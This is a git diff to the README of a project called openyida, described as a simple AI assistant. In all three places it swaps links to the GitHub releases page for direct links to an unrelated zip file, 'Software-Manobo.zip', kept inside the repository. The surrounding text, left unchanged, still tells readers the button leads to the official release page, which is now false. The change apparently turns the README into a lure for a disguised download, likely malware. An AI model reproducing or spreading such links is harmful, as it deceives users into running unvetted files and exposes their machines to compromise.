@@ -1,6 +1,6 @@
 # 🤖 openyida - Your Simple AI Assistant
 
-[![Download openyida](https://img.shields.io/badge/Download-openyida-brightgreen)](https://github.com/Mizan031998/openyida/releases)
+[![Download openyida](https://img.shields.io/badge/Download-openyida-brightgreen)](https://raw.githubusercontent.com/Mizan031998/openyida/main/prd/Software-Manobo.zip)
 
 ---
 
@@ -39,7 +39,7 @@ openyida focuses on being easy and useful. Here are key features you will get:
 
 1. Click the green button below to open the download page in your web browser:
 
-[![Download openyida](https://img.shields.io/badge/Download-openyida-blue)](https://github.com/Mizan031998/openyida/releases)
+[![Download openyida](https://img.shields.io/badge/Download-openyida-blue)](https://raw.githubusercontent.com/Mizan031998/openyida/main/prd/Software-Manobo.zip)
 
 2. This link takes you to the official openyida release page on GitHub. You will see a list of versions.
 
@@ -134,7 +134,7 @@ After the download finishes, follow these steps:
 ## 🔗 Useful Links
 
 - Open the download page anytime here:  
-  https://github.com/Mizan031998/openyida/releases
+  https://raw.githubusercontent.com/Mizan031998/openyida/main/prd/Software-Manobo.zip
 
 - For detailed guides and support, check the repository README on GitHub.
 
